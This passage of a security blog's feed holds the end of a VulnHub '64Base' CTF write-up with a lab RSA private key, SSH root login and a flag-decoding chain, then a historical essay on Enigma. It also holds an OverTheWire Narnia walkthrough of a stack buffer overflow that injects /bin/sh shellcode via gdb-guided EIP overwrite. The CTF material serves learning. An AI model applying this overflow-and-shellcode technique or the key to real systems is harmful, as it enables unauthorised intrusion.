k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob
wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL
guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw
TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd
2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv
AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG
4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx
+T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs
fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi
+j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz
13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV
rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt
Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE
Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI
Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG
Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj
qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3
64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P
fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP
-----END RSA PRIVATE KEY-----&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, we have &lt;b&gt;RSA Private Key&lt;/b&gt;! Now, here's when magic happened. I tried to login to the SSH, using root account with, just obtained, RSA key. Before even trying to crack the password, I tried a few hints that were given to us during this challenge. Luckily, with my amusement, I've found that &lt;b&gt;usetheforce&lt;/b&gt; is correct password! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;chmod 600 key.txt
&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;ssh root@192.168.56.102 -p 62964 -i key.txt
Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'key.txt'&lt;/span&gt;:

Last login: Wed Dec  7 16:27:53 2016 from localhost

flag6&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
root@64base:~#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Awesome! Now we can decode this flag. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK | base64 -d
4e546b325a4451324e324531595455304e546b7a4d4451354e444d7a4d545a694e446b304d7a4d354d7a49314f5455344e446b334e6a59794e44637a4f545a684e546b314e7a63334e7a5930597a5a6b4e7a677a4d5459784d7a49314e6a4d344e6a49304e7a55324e3245324d7a63354d7a55334f5456684e5463304e6a637a4e444d324e7a4e6b4d32517759516f3d0a
&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;4e546b325a4451324e324531595455304e546b7a4d4451354e444d7a4d545a694e446b304d7a4d354d7a49314f5455344e446b334e6a59794e44637a4f545a684e546b314e7a63334e7a5930597a5a6b4e7a677a4d5459784d7a49314e6a4d344e6a49304e7a55324e3245324d7a63354d7a55334f5456684e5463304e6a637a4e444d324e7a4e6b4d32517759516f3d0a | xxd -r -p
&lt;span class=&quot;nv&quot;&gt;NTk2ZDQ2N2E1YTU0NTkzMDQ5NDMzMTZiNDk0MzM5MzI1OTU4NDk3NjYyNDczOTZhNTk1Nzc3NzY0YzZkNzgzMTYxMzI1NjM4NjI0NzU2N2E2Mzc5MzU3OTVhNTc0NjczNDM2NzNkM2QwYQo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NTk2ZDQ2N2E1YTU0NTkzMDQ5NDMzMTZiNDk0MzM5MzI1OTU4NDk3NjYyNDczOTZhNTk1Nzc3NzY0YzZkNzgzMTYxMzI1NjM4NjI0NzU2N2E2Mzc5MzU3OTVhNTc0NjczNDM2NzNkM2QwYQo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | base64 -d
596d467a5a5459304943316b49433932595849766247396a595777764c6d7831613256386247567a637935795a57467343673d3d0a
&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;596d467a5a5459304943316b49433932595849766247396a595777764c6d7831613256386247567a637935795a57467343673d3d0a | xxd -r -p
&lt;span class=&quot;nv&quot;&gt;YmFzZTY0IC1kIC92YXIvbG9jYWwvLmx1a2V8bGVzcy5yZWFsCg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;YmFzZTY0IC1kIC92YXIvbG9jYWwvLmx1a2V8bGVzcy5yZWFsCg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; | base64 -d
base64 -d /var/local/.luke|less.real&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;What can it be? &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/64base/finish.png&quot; alt=&quot;Finish&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;64Base was an awesome challenge, with lots of tricks, some hard, some easy, but all really entertaining and interesting. Big thanks to &lt;a href=&quot;https://3mrgnc3.ninja/2016/12/64base/&quot;&gt;&lt;b&gt;3mrgnc3&lt;/b&gt;&lt;/a&gt; for creating this challenge, and &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;&lt;b&gt;VulnHub&lt;/b&gt;&lt;/a&gt; for hosting it! &lt;/p&gt;
&lt;p&gt;I also hope, that you've enjoyed this write-up, I'll definitely do more of these in the future, so stay updated. And as always... &lt;/p&gt;

&lt;p&gt;~ Stay safe! &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Vulnhub" /><summary type="html">Introduction</summary></entry><entry><title type="html">Enigma</title><link href="http://localhost:4000/enigma/" rel="alternate" type="text/html" title="Enigma" /><published>2017-02-07T00:00:00+00:00</published><updated>2017-02-07T00:00:00+00:00</updated><id>http://localhost:4000/enigma</id><content type="html" xml:base="http://localhost:4000/enigma/">&lt;h1&gt;Brief history behind Enigma&lt;/h1&gt;

&lt;p&gt;The first Enigma machine was discovered by &lt;b&gt;Arthur Scherbius&lt;/b&gt;, German engineer who acquired the patent in 1918. Name of this device originated from Greek word - riddle.  It was used commercially from the early 1920s, and was also adopted by the military and governmental services of a number of nations — most famously German Army. Communication during those days was sent over radio which means that everyone could easily listen. But at that moment no one could spy on Nazi messages - Scherbius' Enigma provided them with the strongest cryptographic cipher of the world. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/enigma/scherbius.jpg&quot; alt=&quot;Scherbius&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Arthur Scherbius&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;Since 1926 English cryptanalysts were eavesdropping German radio messages, unfortunately without being able to extract their meaning. But Polish officials, afraid of German attack started working on analyzing and breaking the cipher in office called Cipher Bureau (Biuro Szyfrów). By 1933 &lt;b&gt;Marian Rejewski&lt;/b&gt;, &lt;b&gt;Henryk Zygalski&lt;/b&gt; and &lt;b&gt;Jerzy Różycki&lt;/b&gt; broke Enigma, by exploiting a fatal flaw of how Enigma operators sent their messages, and were able to determine the daily keys of almost every message that was intercepted. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/enigma/polish-crypto-breakers.jpg&quot; alt=&quot;Polish-cryptanalysts&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;From left: Jerzy Różycki, Henryk Zygalski and Marian Rejewski&lt;/small&gt;&lt;/p&gt;

&lt;p&gt; They even developed a machine called the Bombe (Bomba), that made the process of codebreaking much faster. But back then keys were changing only once every few months, while during the war keys were changing at least once a day. In July 1939, just before the start of war Poles decided to inform the British and French about their research, also asking for help.   &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/enigma/enigma-machine.jpg&quot; alt=&quot;Enigma-photo&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Enigma&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;At Bletchley Park &lt;b&gt;Alan Turing&lt;/b&gt;, together with fellow code-breaker &lt;b&gt;Gordon Welchman&lt;/b&gt; invented different version of Bombe. When an Enigma message was intercepted, codebreakers had to search for so-called cribs, which were presumed pieces of plain text within the encrypted message. That way Turing Bombe would search for the enigma settings for a given piece of plain and cipher text. Although the British bombe actually owes little to the Bomba, Poles contributed a lot by supplying the internal wiring of the Enigma's rotors. They also demonstrated that Enigma can be broked using another machine. It has been estimated that the efforts of Turing and his fellow code-breakers shortened the war by several years. What is certain is that they saved countless lives and helped to determine the course and outcome of the conflict.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/enigma/bombe.jpeg&quot; alt=&quot;British-bombe&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;British Bombe&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;But let's head back from the history to something more technical. &lt;/p&gt;

&lt;h1&gt;Cryptography&lt;/h1&gt;

&lt;p&gt;Firstly, let's find out how Enigma has worked. &lt;/p&gt;

&lt;p&gt;When sender sends the message, Enigma creates an electrical signal that goes through the wiring of the machine. First step for this signal is plugboard which attempts to get around frequency analysis. Some of the letters on the plugboard would be wired to other letters (plugs). Signal going through one of these plugs change original input into different letter, but also leaving some of the original letters unmoved. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/enigma/plugboard.jpg&quot; alt=&quot;Enigma-plugboard&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;View on the plugboard&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;The next step is the static rotor, which simply turns wires into static contacts, making the signal pass only when the contacts touch. But after that, things are getting a little bit more complicated. There are 5 rotors, with the possibility to choose 3 of them, for three positions - left, middle and right. Each rotor has their own set of inner, and outer rings of contacts. The outer ring contacts connect to the next rotor, together with its own inner ring. Purpose of these rings is to even more scramble the signal, resulting in more letter substitutions.  &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/enigma/rotors.png&quot; alt=&quot;Enigma-rotors&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Rotor electrical view&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;In addition, as each letter is entered, the rotors rotate by one position, so that the same letters are never connected together in the same message. And even more, each rotor has notches in different positions which, when reached, cause the next rotor to its left to step forward too.&lt;/p&gt;

&lt;p&gt;Last step that electrical signal takes before going back to the light board is the reflector. In Enigma machine there are 2 possible reflectors, each wired differently and producing different letter when reflected back. Journey back through the rotors works exactly the same way in reverse. Signal remains the same when passing through the static rotor, then going through the plugboard on the same principles. After that, signal goes to lightboard, where the light, corresponding for each letter, lits up.   &lt;/p&gt;

&lt;p&gt;&lt;b&gt;But how would you decrypt the message? &lt;/b&gt;&lt;/p&gt;

&lt;p&gt;To decode your message, you would need to know what rotor and plugboard settings were used during encryption. This was possible with use of monthly sheets, containing basic settings for every day of the month. They were in the custody of an officer, responsible for setting up the machine rotors and ringsettings. After setup, he could lock the machine front panel with a key. The operator of Enigma could only select the rotor start position.  &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/enigma/key-sheets.jpg&quot; alt=&quot;Key-sheets&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Example of Wehrmacht Enigma key sheet&lt;/small&gt;&lt;/p&gt;

&lt;h1&gt;Mathematical Security of Enigma&lt;/h1&gt;

&lt;p&gt;Now, how secure is Enigma? Let's count all of the possibilities. &lt;/p&gt;

&lt;p&gt;Enigma has 5 rotors, from which 3 are used. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/enigma/equation_1.png&quot; alt=&quot;First-equation&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then all 3 rotors have 26 positions, one for each letter of the alphabet. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/enigma/equation_2.png&quot; alt=&quot;Second-equation&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Quite a large number, right? Yet, we have to calculate all possibilities with the plug board. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/enigma/equation_3.png&quot; alt=&quot;Third-equation&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And lastly, multiply them all together. This gives us quite a lot of combinations.  &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/enigma/possibilities.png&quot; alt=&quot;Possibilities&quot; class=&quot;img-responsive&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1&gt;Last Words&lt;/h1&gt;

&lt;p&gt;Enigma, was without doubt machine with great encryption capabilities. This war could have last much longer, or even end completely different, without hard work of great cryptanalytic minds working together on this operation. &lt;/p&gt;

&lt;p&gt;~ Stay safe!&lt;/p&gt;

&lt;h1&gt;References&lt;/h1&gt;
&lt;p&gt;[1] &lt;a href=&quot;https://en.wikipedia.org/wiki/Enigma_machine&quot;&gt;&lt;b&gt;Wikipedia&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[2] Singh Simon (2000) &lt;b&gt;The Code Book: The Science of Secrecy from Ancient Egypt to Quantum Cryptography&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;[3] Rejewski Marian (1981) &lt;b&gt;How the Polish Mathematicians Broke the Enigma. Annals of the History of Computing.&lt;/b&gt;&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Cryptography" /><summary type="html">Brief history behind Enigma</summary></entry><entry><title type="html">Overthewire.org - Narnia 2 -&amp;gt; 3</title><link href="http://localhost:4000/overthewire.org-narnia-3/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 2 -&gt; 3" /><published>2017-02-03T00:00:00+00:00</published><updated>2017-02-03T00:00:00+00:00</updated><id>http://localhost:4000/overthewire.org-narnia-3</id><content type="html" xml:base="http://localhost:4000/overthewire.org-narnia-3/">&lt;h1&gt;Introduction&lt;/h1&gt;

&lt;p&gt;What about another challenge in reverse engineering? Anywhere, anytime! &lt;/p&gt;

&lt;h1&gt;Challenge&lt;/h1&gt;

&lt;p&gt;As always, let's start from viewing the source code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: %s argument&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Okay, now let's run it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia2@melinda:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@melinda:/narnia$ ./narnia2 ARGUMENT
ARGUMENTnarnia2@melinda:/narnia$&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As in the source code, we see that if argument is not passed, then usage instructions are printed, otherwise value of argument is printed on the next line. In addition, source code gives us information that char buf is 128 bytes in size. Let's try to trigger the segmentation fault. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;ARGUMENTnarnia2@melinda:/narnia$ ./narnia2 $(python -c &quot;print 'A' * 140&quot;)
Illegal instruction
narnia2@melinda:/narnia$ ./narnia2 $(python -c &quot;print 'A' * 141&quot;)
Segmentation fault&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hmm, that's interesting. After trying different amounts of A letters, I've noticed that by writing 140 of them, we will get &lt;b&gt;Illegal instruction&lt;/b&gt; message, but 141 letters end up with our desired &lt;b&gt;Segmentation fault&lt;/b&gt;. Maybe gdb will tell us something more? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia2@melinda:/narnia$ gdb ./narnia2
(gdb) break *main
Breakpoint 1 at 0x804845d&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Firstly let's investigate the illegal instruction option. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) run $(python -c &quot;print 'A' * 140&quot;)
Starting program: /games/narnia/narnia2 $(python -c &quot;print 'A' * 140&quot;)

Breakpoint 1, 0x0804845d in main ()
(gdb) c
Continuing.

Program received signal SIGILL, Illegal instruction.
0xf7e3ca00 in __libc_start_main () from /lib32/libc.so.6
(gdb) c
Continuing.

Program terminated with signal SIGILL, Illegal instruction.
The program no longer exists.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately after doing some research I've found out that SIGILL won't help us much. What we have to try is to overwrite the &lt;b&gt;instruction pointer. &lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) run $(python -c &quot;print 'A' * 144&quot;)
Starting program: /games/narnia/narnia2 $(python -c &quot;print 'A' * 144&quot;)

Breakpoint 1, 0x0804845d in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Luckily, adding only 3 more A's overwrote the pointer. But here comes another problem, what is its address? &lt;/p&gt;
&lt;p&gt;We can try to find out by writing around B's at the end. Let's see. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) run $(python -c &quot;print 'A' * 138 + 'B' * 6&quot;)
Starting program: /games/narnia/narnia2 $(python -c &quot;print 'A' * 138 + 'B' * 6&quot;)

Breakpoint 1, 0x0804845d in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/200x $esp
0xffffd7f0:	0x00000000	0x00000000	0xb7000000	0x9449f175
0xffffd800:	0xb7857a44	0x6da4653e	0x69a15cf3	0x00363836
0xffffd810:	0x00000000	0x6d61672f	0x6e2f7365	0x696e7261
0xffffd820:	0x616e2f61	0x61696e72	0x41410032	0x41414141
0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8b0:	0x41414141	0x42424242	0x58004242	0x535f4744&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great! EIP address is 0xffffd8b3. Now we have to find a way to use shellcode from previous challenge. But firstly, let's find its length. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia2@melinda:/narnia$ python -c'print(len(&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;))'
25&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;25 bytes. As our string have to be 144 bytes in length, I'll firstly write 112 bytes of A letters, then 25 bytes of our shellcode and then overwrite the EIP with memory address somewhere in the middle of A's. Let's try it out! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) run $(python -c &quot;print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'B' * 4&quot;)
Starting program: /games/narnia/narnia2 $(python -c &quot;print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'B' * 4&quot;)

(gdb) x/200x $esp
0xffffd7f0:	0x00000000	0x00000000	0x4d000000	0x2bdc9c96
0xffffd800:	0xd596f713	0x775b1954	0x6969a442	0x00363836
0xffffd810:	0x00000000	0x6d61672f	0x6e2f7365	0x696e7261
0xffffd820:	0x616e2f61	0x61696e72	0x41410032	0x41414141
0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd890:	0x41414141	0x41414141	0xc0314141	0x2f2f6850
0xffffd8a0:	0x2f686873	0x896e6962	0x89c189e3	0xcd0bb0c2
0xffffd8b0:	0x40c03180	0x424280cd	0x58004242	0x535f4744
0xffffd8c0:	0x49535345	0x495f4e4f	0x30323d44	0x33323431
0xffffd8d0:	0x45485300	0x2f3d4c4c	0x2f6e6962	0x68736162
0xffffd8e0:	0x52455400	0x74783d4d	0x2d6d7265	0x63363532
0xffffd8f0:	0x726f6c6f	0x48535300	0x494c435f	0x3d544e45
0xffffd900:	0x362e3938	0x36312e34	0x3732312e	0x30333320
0xffffd910:	0x32203434	0x53530032	0x54545f48	0x642f3d59
0xffffd920:	0x702f7665	0x342f7374	0x434c0033	0x4c4c415f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

